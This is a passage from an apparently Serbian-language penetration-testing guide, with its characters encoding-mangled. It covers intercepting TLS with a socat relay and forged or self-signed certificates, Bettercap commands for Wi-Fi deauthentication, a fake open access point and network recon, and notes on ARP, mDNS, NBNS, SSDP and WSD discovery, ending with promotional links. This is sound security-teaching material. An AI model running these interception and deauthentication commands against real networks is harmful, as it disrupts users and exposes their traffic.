3. Pokrenite alat za presretanje saobraÄ‡aja i osluÅ¡kujte na odreÄ‘enom portu. Na primer, moÅ¾ete koristiti alat `mitmproxy` sa sledeÄ‡om komandom: `mitmproxy -p <port>`.

4. Podesite preusmerenje saobraÄ‡aja na odreÄ‘ene hostove. To moÅ¾ete postiÄ‡i konfigurisanjem alata za presretanje saobraÄ‡aja da preusmerava saobraÄ‡aj na odreÄ‘ene IP adrese ili domene.

Kada je sve konfigurisano, alat za presretanje saobraÄ‡aja Ä‡e presretati SSL/TLS saobraÄ‡aj i preusmeravati ga na odreÄ‘ene hostove koje ste konfigurisali. Ovo vam omoguÄ‡ava da analizirate i manipuliÅ¡ete saobraÄ‡aj izmeÄ‘u klijenta i servera.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Ponekad, ako klijent proveri da li je CA validan, moÅ¾ete **posluÅ¾iti sertifikat druge hostne ime potpisan od strane CA**.\
JoÅ¡ jedan interesantan test je da posluÅ¾ite **sertifikat za traÅ¾eno hostno ime, ali samopotpisan**.

Druga stvar koju treba testirati je pokuÅ¡aj potpisivanja sertifikata sa validnim sertifikatom koji nije validan CA. Ili koriÅ¡Ä‡enje validnog javnog kljuÄa, prisiljavanje na koriÅ¡Ä‡enje algoritma kao Å¡to je Diffie-Hellman (koji ne zahteva deÅ¡ifrovanje bilo Äega sa stvarnim privatnim kljuÄem) i kada klijent zatraÅ¾i probu stvarnog privatnog kljuÄa (kao Å¡to je heÅ¡), poslati laÅ¾nu probu i oÄekivati da klijent to ne proveri.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### BeleÅ¡ke o aktivnom otkrivanju

Imajte na umu da kada se UDP paket poÅ¡alje ureÄ‘aju koji nema traÅ¾eni port, Å¡alje se ICMP (Port Unreachable) poruka.

### **ARP otkrivanje**

ARP paketi se koriste za otkrivanje IP adresa koje se koriste unutar mreÅ¾e. RaÄunar mora poslati zahtev za svaku moguÄ‡u IP adresu, a samo one koje se koriste Ä‡e odgovoriti.

### **mDNS (multicast DNS)**

Bettercap Å¡alje mDNS zahtev (svakih X ms) traÅ¾eÄ‡i **\_services\_.dns-sd.\_udp.local** maÅ¡ina koja vidi ovaj paket obiÄno odgovara na ovaj zahtev. Zatim, samo traÅ¾i maÅ¡ine koje odgovaraju na "services".

**Alati**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap emituje pakete na port 137/UDP traÅ¾eÄ‡i ime "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap emituje SSDP pakete traÅ¾eÄ‡i sve vrste usluga (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap emituje WSD pakete traÅ¾eÄ‡i usluge (UDP Port 3702).

## Reference

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty savet**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! PridruÅ¾ite nam se danas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
